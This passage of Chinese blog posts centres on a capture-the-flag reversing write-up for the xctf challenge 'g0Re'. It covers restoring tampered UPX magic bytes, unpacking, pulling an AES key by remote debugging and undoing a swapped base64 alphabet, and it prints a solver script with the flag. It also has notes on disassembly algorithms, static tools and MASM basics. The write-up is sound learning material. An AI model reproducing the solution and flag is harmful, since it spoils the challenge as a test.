-<ul>
-<li>考虑样本不同特征组的重要程度，三阶段特征选择，解决样本维度问题；</li>
-<li>代价敏感学习(Cost Sensitive Learning)和SMOTE重采样解决数据不平衡问题。</li>
-</ul>
-<h3 id><a href="#" class="headerlink" title=" "></a> </h3>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/IDAPro01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/IDAPro01/" class="post-title-link" itemprop="url">SP-Analysis failed[Xctf g0Re]</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-07-29 14:58:58" itemprop="dateCreated datePublished" datetime="2023-07-29T14:58:58+08:00">2023-07-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-07-30 21:24:56" itemprop="dateModified" datetime="2023-07-30T21:24:56+08:00">2023-07-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>xctf的一道Go语言逆向题，涉及AES加密和base64换表加密。</p>
-<p>用IDA打开g0Re报告<code>SP-Analysis failed</code>错误。</p>
-<p><img src="/categories/Notes/IDAPro01/1690613919182.png" alt="1690613919182"></p>
-<h2 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h2><p>将文件拷贝到kali后，静态检测一番。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ file g0Re               </span><br><span class="line">g0Re: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header</span><br><span class="line"></span><br><span class="line">readelf -hlS --w g0Re</span><br></pre></td></tr></table></figure>
-<p>报告如下错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readelf: Warning: Section 49 has an out of range sh_link value of 2302008908</span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0] &lt;no-strings&gt;      00010102: &lt;unknown&gt; 00000001003e0002 481cb0 000040 400003      0   0 15762873573703680</span><br><span class="line">readelf: Warning: [ 1]: Link field (533963) should index a symtab section.</span><br><span class="line">readelf: Warning: [ 3]: Unexpected value (1482181455) in info field.</span><br></pre></td></tr></table></figure>
-<p>strings找到一些特征字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/idawork]</span><br><span class="line">└─$ strings -a  -tx g0Re|grep -E &#x27;\s&#123;4,30&#125;&#x27;</span><br><span class="line">     ec OKXX$</span><br><span class="line">    13e FN&#123;o</span><br><span class="line">    1e6 r mL</span><br><span class="line">    284 dRe6eYPgXygMd</span><br><span class="line">    295 fSCPpMP/C9DU36D2kliiYS5D9wKG/E_p</span><br><span class="line">    2b9 XkJb3WwcGMbUPd63r/bG8gVDS6EsZ5vv</span><br><span class="line">  81e18 $Info: This file is packed with the                                           </span><br><span class="line">  81e67 $Id:  </span><br></pre></td></tr></table></figure></p>
-<p>猜测是UPX加壳，但是UPX标志被抹去了。</p>
-<h2 id="UPX-标志被抹除"><a href="#UPX-标志被抹除" class="headerlink" title="UPX! 标志被抹除"></a>UPX! 标志被抹除</h2><p>unpack时会依次在三个地方检查UPX_MAGIC_LE32（即”UPX!”）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在倒数第36字节偏移处检查，如果特征值不符就会转入throwNotPacked()异常抛出函数，打印not packed by UPX；</span><br><span class="line">2、&quot;.ELF&quot;魔数前36字节处，如果这里的特征值不符就会转入throwCantUnpack()异常抛出函数，打印l_info corrupted；</span><br><span class="line">3、 在倒数第46字节偏移处检查，如果特征值不符就会转入throwCompressedDataViolation()异常抛出函数，打印Exception: compressed data violation；</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/Notes/IDAPro01/1690711701628.png" alt="1690711701628"></p>
-<p>结合上面的规则2，可以很清晰地判断出出题人用<code>0KXX</code>代替了<code>UPX!</code>。</p>
-<p><img src="/categories/Notes/IDAPro01/1690712364661.png" alt="1690712364661"></p>
-<p>在对应的三个位置处换上UPX!魔数。</p>
-<p><img src="/categories/Notes/IDAPro01/1690713002432.png" alt="1690713002432"></p>
-<p><img src="/categories/Notes/IDAPro01/1690712555711.png" alt="1690712555711"></p>
-<p>upx脱壳。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/idawork]</span><br><span class="line">└─$ upx -d g0Re_upx </span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">   1331200 &lt;-    534092   40.12%   linux/amd64   g0Re_upx</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure>
-<h2 id="输入flag后的处理流程"><a href="#输入flag后的处理流程" class="headerlink" title="输入flag后的处理流程"></a>输入flag后的处理流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_int64 __usercall sub_48CD80@&lt;rax&gt;(__int64 i%16@&lt;rdi&gt;, __int64 key[i%16]@&lt;rsi&gt;, __int64 a3@&lt;r14&gt;, __int128 a4@&lt;xmm15&gt;)</span><br></pre></td></tr></table></figure>
-<p>1.aes   2.base64    3.简单运算</p>
-<p><img src="/categories/Notes/IDAPro01/1690723199822.png" alt="1690723199822"></p>
-<p><img src="/categories/Notes/IDAPro01/1690723104727.png" alt="1690723104727"></p>
-<h2 id="aes加密-密钥获取"><a href="#aes加密-密钥获取" class="headerlink" title="aes加密 密钥获取"></a>aes加密 密钥获取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态调试获取密钥：wvgitbygwbk2b46d</span><br></pre></td></tr></table></figure>
-<p>启动ida服务端。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#端口，密码，详细模式</span></span><br><span class="line"><span class="comment">#若希望同时维护几个调试实例，就要在不同端口启动调试服务器。</span></span><br><span class="line">./linux_server64 -p23946 -p23946 -v</span><br><span class="line">IDA Linux 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/categories/Notes/IDAPro01/1690716983450.png" alt="1690716983450"></p>
-<p>Hex窗口与RSI同步。</p>
-<p><img src="/categories/Notes/IDAPro01/1690718805904.png" alt="1690718805904"></p>
-<h2 id="base64换表加密"><a href="#base64换表加密" class="headerlink" title="base64换表加密"></a>base64换表加密</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings -tx g0Re_upx|grep -E &#x27;[A-Z]&#123;10,64&#125;&#x27; </span><br><span class="line">12c040 456789&#125;#IJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123ABCDEFGH</span><br></pre></td></tr></table></figure>
-<h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">string1 = <span class="string">&quot;456789&#125;#IJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123ABCDEFGH&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="comment">#ascii字符范围</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_printable_chars</span>(<span class="params">flag</span>):</span><br><span class="line">    filtered_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">in</span> string1:</span><br><span class="line">            filtered_flag+=byte</span><br><span class="line">        <span class="comment">#else:</span></span><br><span class="line">            <span class="comment">#print(&quot;ERROR&quot;)</span></span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">    <span class="keyword">return</span> filtered_flag</span><br><span class="line"></span><br><span class="line">enc=[    <span class="number">0xE6</span>, <span class="number">0xCE</span>, <span class="number">0x89</span>, <span class="number">0xC8</span>, <span class="number">0xCF</span>, <span class="number">0xC5</span>, <span class="number">0xF5</span>, <span class="number">0xC9</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>,   <span class="number">0xC0</span>, <span class="number">0x91</span>, <span class="number">0xCE</span>, <span class="number">0x7F</span>, <span class="number">0xAC</span>, <span class="number">0xCC</span>, <span class="number">0xE9</span>, <span class="number">0xCF</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>,   <span class="number">0x96</span>, <span class="number">0xD4</span>, <span class="number">0xEA</span>, <span class="number">0x92</span>, <span class="number">0xE2</span>, <span class="number">0xD7</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0xCB</span>, <span class="number">0xA5</span>,   <span class="number">0xAE</span>, <span class="number">0x93</span>, <span class="number">0xA6</span>, <span class="number">0xCA</span>, <span class="number">0xBE</span>, <span class="number">0x97</span>, <span class="number">0xDF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xC9</span>,   <span class="number">0xB7</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x6B</span>, <span class="number">0xC4</span>, <span class="number">0xB1</span>, <span class="number">0x65</span>, <span class="number">0xDB</span>, <span class="number">0xCE</span>, <span class="number">0xED</span>,   <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0xD6</span>, <span class="number">0x8C</span>, <span class="number">0xED</span>, <span class="number">0xC3</span>, <span class="number">0xA3</span>, <span class="number">0xDA</span>, <span class="number">0x94</span>, <span class="number">0xA5</span>,   <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xA7</span>, <span class="number">0x55</span>]</span><br><span class="line">key=<span class="string">b&quot;wvgitbygwbk2b46d&quot;</span></span><br><span class="line">base = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):    </span><br><span class="line">    base+=<span class="built_in">chr</span>(((enc[i]-key[i%<span class="number">16</span>])^<span class="number">0x1a</span>) &amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="built_in">print</span>(base)<span class="comment">#uB8EAyfxAmOEvQlrhCJM8hk1qonHskb55NM4qvmxZeY#xg5mMm10x0nF6b3iRdeYÄ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤base64编码表里的字符</span></span><br><span class="line">str1=filter_printable_chars(base)</span><br><span class="line">result=base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#AES解密</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES<span class="comment"># </span></span><br><span class="line">aes = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(result)) <span class="comment">#b&#x27;flag&#123;g0_1s_th3_b3st_1anguage_1n_the_wOrld!_xxx&#125;\x01&#x27;</span></span><br></pre></td></tr></table></figure>
-<h2 id="反汇编算法"><a href="#反汇编算法" class="headerlink" title="反汇编算法"></a>反汇编算法</h2><ul>
-<li>1.线性扫描反汇编 关键是确定代码起始位置，之后线性扫描整个代码段，并逐条反汇编每条指令。不会识别分支来解释控制流。<ul>
-<li>优点：覆盖程序的所有代码段；</li>
-<li>缺点：假设代码段中全是代码，没法处理代码段中混入的数据。</li>
-</ul>
-</li>
-<li>2.递归下降反汇编。根据指令间的引用关系决定是否反汇编，在一个代码块内部，还是使用线性扫描算法。<ul>
-<li>优点：大部分情况下可以区分代码和数据。</li>
-<li>缺点：无法处理间接代码路径。</li>
-</ul>
-</li>
-</ul>
-<p>IDA pro是递归下降反汇编器。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//add、xor、mov、栈操作push</span></span><br><span class="line"><span class="keyword">case</span> 顺序流指令:</span><br><span class="line">	线性扫描反汇编</span><br><span class="line"><span class="comment">//jnz、ja</span></span><br><span class="line"><span class="keyword">case</span> 条件分支指令:</span><br><span class="line">	反汇编两个路径，直接反汇编下一条指令对应的分支，将跳转目标指令的地址加入延迟反汇编地址列表。</span><br><span class="line"><span class="comment">//jmp</span></span><br><span class="line"><span class="keyword">case</span> 无条件分支指令:</span><br><span class="line">	确定跳转目标，反汇编目的地址；对于无条件分支后的字节不作处理。</span><br><span class="line">，</span><br><span class="line"><span class="comment">//call</span></span><br><span class="line"><span class="keyword">case</span> 函数调用指令:</span><br><span class="line">	运行方式类似于无条件跳转，但是其后的返回地址会被直接反汇编，将跳转目标指令的地址加入延迟反汇编地址列表。</span><br><span class="line"><span class="comment">//ret,</span></span><br><span class="line"><span class="keyword">case</span> 返回指令:</span><br><span class="line">	获取接下来将要执行的指令信息；有时需要从栈顶获取，而静态反汇编器不具备访问栈的能力。此时反汇编器会开始处理延迟反汇编地址列表。</span><br></pre></td></tr></table></figure>
-<h2 id="反汇编出问题的情形"><a href="#反汇编出问题的情形" class="headerlink" title="反汇编出问题的情形"></a>反汇编出问题的情形</h2><p>1.对于无条件分支指令，例如jmp eax这样的运行时才能确定跳转地址的指令，需要人工赋值。</p>
-<p>2.call指令，在函数内部篡改了函数返回地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">foo proc near</span><br><span class="line">	inc  dword ptr[esp];</span><br><span class="line">	retn</span><br><span class="line">endp</span><br><span class="line">//错误的反汇编</span><br><span class="line">E8 F7 FF FF FF call foo</span><br><span class="line">05 89 45 F8 90 add eax,90F84589h</span><br><span class="line"></span><br><span class="line">//正确的反汇编</span><br><span class="line">E8 F7 FF FF FF call foo</span><br><span class="line">05 				db  5</span><br><span class="line">89 45 F8 		mov [ebp-8],eax</span><br><span class="line">90 				nop</span><br></pre></td></tr></table></figure>
-<p>3.ret没有提供返回地址。</p>
-<p><img src="/categories/Notes/IDAPro01/1690714484074.png" alt="1690714484074"></p>
-<p> IDA遇到的函数返回语句，检测到其栈指针值不为0。</p>
-<h2 id="反汇编的困难"><a href="#反汇编的困难" class="headerlink" title="反汇编的困难"></a>反汇编的困难</h2><p>1.编译，和自然语言的翻译一样是一个多对多操作。除了C编译器，还有Go、Python、Delphi编译器、WinAPI库，反编译器非常依赖语言和库。</p>
-<p>2.编译过程中会丢失命名和类型信息。反汇编后最多知道变量的位数，类型信息需要通过变量的用途确定。</p>
-<h2 id="一些静态工具用法"><a href="#一些静态工具用法" class="headerlink" title="一些静态工具用法"></a>一些静态工具用法</h2><ul>
-<li><p>Linux:ldd；  nm展示符号，C++filter、展示重定义。</p>
-</li>
-<li><p>OSX:otool；  处理MACH-O。</p>
-</li>
-<li><p>Windows:VS里的dumpbin /dependents  ；objdump</p>
-</li>
-</ul>
-<h3 id="ldd显示依赖库"><a href="#ldd显示依赖库" class="headerlink" title="ldd显示依赖库"></a>ldd显示依赖库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/idawork]</span><br><span class="line">└─$ ldd linux_server64 </span><br><span class="line">        linux-vdso.so.1 (0x00007fff323bf000)</span><br><span class="line">        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fbfef767000)</span><br><span class="line">        libthread_db.so.1 =&gt; /lib/x86_64-linux-gnu/libthread_db.so.1 (0x00007fbfef75c000)</span><br><span class="line">        librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007fbfef751000)</span><br><span class="line">        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fbfef730000)</span><br><span class="line">        libstdc++.so.6 =&gt; /lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007fbfef515000)</span><br><span class="line">        libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fbfef3d2000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbfef1f6000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fbfef782000)</span><br><span class="line">        libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007fbfef1d6000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="dumpbin-dependents"><a href="#dumpbin-dependents" class="headerlink" title="dumpbin /dependents"></a>dumpbin /dependents</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Dump of file baby.exe</span><br><span class="line"></span><br><span class="line">File <span class="built_in">Type</span>: EXECUTABLE IMAGE</span><br><span class="line"></span><br><span class="line">  Image has the following dependencies:</span><br><span class="line"></span><br><span class="line">    KERNEL32.dll</span><br><span class="line">    msvcrt.dll</span><br><span class="line">    msvcrt.dll</span><br><span class="line"></span><br><span class="line">  Summary</span><br><span class="line"></span><br><span class="line">        <span class="number">1000</span> .CRT  C runtime Lib</span><br><span class="line">        <span class="number">1000</span> .bss</span><br><span class="line">        <span class="number">1000</span> .data</span><br><span class="line">        <span class="number">1000</span> .debug_abbrev</span><br><span class="line">        <span class="number">1000</span> .debug_aranges</span><br><span class="line">        <span class="number">1000</span> .debug_frame</span><br><span class="line">        <span class="number">2000</span> .debug_info</span><br><span class="line">        <span class="number">1000</span> .debug_line</span><br><span class="line">        <span class="number">1000</span> .eh_frame</span><br><span class="line">        <span class="number">1000</span> .idata</span><br><span class="line">        <span class="number">1000</span> .rdata</span><br><span class="line">        <span class="number">3000</span> .text</span><br><span class="line">        <span class="number">1000</span> .tls</span><br></pre></td></tr></table></figure>
-<h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>-t 显示字符的文件偏移</p>
-<p>-a 使得strings扫描整个文件，而非只有文件中可加载的、经初始化的部分</p>
-<p>-e 搜素其他字符编码，如Unicode</p>
-<p>几乎不会用到的工具：x86流式反汇编器，ndisasm和diStorm。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Win32_01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/Win32_01/" class="post-title-link" itemprop="url">Windows汇编语言基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-07-18 14:58:58" itemprop="dateCreated datePublished" datetime="2023-07-18T14:58:58+08:00">2023-07-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-02 16:33:57" itemprop="dateModified" datetime="2023-08-02T16:33:57+08:00">2023-08-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="x86汇编语法"><a href="#x86汇编语法" class="headerlink" title="x86汇编语法"></a>x86汇编语法</h2><ul>
-<li>AT&amp;T：GNU工具（Gas：GNU汇编器、gcc、gdb)         <ul>
-<li>前缀：%reg,$立即数</li>
-<li>操作数排序：mov 源操作数,目的操作数  add $0x4,%eax</li>
-</ul>
-</li>
-<li>Intel ：MASM(微软汇编器)、Turbo汇编器、NASM<ul>
-<li>add eax,0x4</li>
-</ul>
-</li>
-</ul>
-<p>.model flat，平坦模式，代码段和数据段共用一个4G段。</p>
-<h2 id="局部变量、"><a href="#局部变量、" class="headerlink" title="局部变量、"></a>局部变量、</h2><p><strong>局部变量是堆栈变量</strong>。作用域是单个子程序，从子程序返回到主程序时被释放。一种规范写法是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL @buffer[10]:BYTE ;LOCAL 变量名1[重复数量]:类型,变量名2[重复数量]:类型</span><br></pre></td></tr></table></figure>
-<p><code>LOCAL</code>用于为堆栈变量预留空间。</p>
-<p>局部变量：只能在过程中用，主程序里不能用；</p>
-<p>堆栈变量：没有初始值，只在调用时分配。C语言中的函数值传递的本质。</p>
-<h2 id="一些常用类型整理"><a href="#一些常用类型整理" class="headerlink" title="一些常用类型整理"></a>一些常用类型整理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte db,word dw,DWORD dd,fword df,QWORD dq,tbyte dt  1,2,4,6,8,10</span><br><span class="line">WNDCLASS</span><br></pre></td></tr></table></figure>
-<ul>
-<li>TYPE返回变量大小</li>
-<li>LENGTHOF  返回变量元素个数</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;,用于表示一个变量是否结束</span><br><span class="line">var6 dw 10,20,30,40,50</span><br><span class="line">	 dw 60,70,80,90,99</span><br><span class="line">var7 dw 10,20,30,40,50,</span><br><span class="line">	    60,70,80,90,99	 </span><br><span class="line">LENGTHOF var6 ;5</span><br><span class="line">LENGTHOF var7 ;10</span><br></pre></td></tr></table></figure>
-<ul>
-<li>SIZE，SIZEOF返回所占字节数=LENGTHOF*TYPR</li>
-</ul>
-<h2 id="1-和EQU伪指令"><a href="#1-和EQU伪指令" class="headerlink" title="1.=和EQU伪指令"></a>1.=和EQU伪指令</h2><p>由等号或者EQU定义的符号常量<strong>不占用存储空间。</strong></p>
-<p>EQU类似于等号伪指令，但是EQU伪指令不许重复定义，而等号伪指令可以（同一个常量名可重复定义多次）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">presskey EQU &lt;&quot;Output is:&quot;&gt;</span><br><span class="line">.data</span><br><span class="line">propt db presskey</span><br></pre></td></tr></table></figure>
-<h2 id="2-当前地址运算符"><a href="#2-当前地址运算符" class="headerlink" title="2.$ 当前地址运算符"></a>2.$ 当前地址运算符</h2><h2 id="3-LEA伪指令"><a href="#3-LEA伪指令" class="headerlink" title="3.LEA伪指令"></a>3.LEA伪指令</h2><p>OFFSET和ADDR编译时起作用，LEA是指令，在运行时起作用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV ESI,ADDR BVAL  ;相当于</span><br><span class="line">LEA ESi,BVAL</span><br></pre></td></tr></table></figure>
-<p>计算堆栈（程序执行是分配）变量的偏移地址时，只能用lea。</p>
-<h2 id="4-PTR-操作符"><a href="#4-PTR-操作符" class="headerlink" title="4.PTR 操作符"></a>4.PTR 操作符</h2><p>按照指定类型在内存中读写值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIST DB 12H,34H,56H,78H;</span><br><span class="line">MOV EAX,DWORD PTR LIST ;EAX  78563412H</span><br></pre></td></tr></table></figure>
-<h2 id="5-ALIGN和EVEN伪指令"><a href="#5-ALIGN和EVEN伪指令" class="headerlink" title="5.ALIGN和EVEN伪指令"></a>5.ALIGN和EVEN伪指令</h2><blockquote>
-<p>CPU处理偶数地址比处理奇数地址要快。 可以在一个内存访问周期内获取该数据 </p>
-</blockquote>
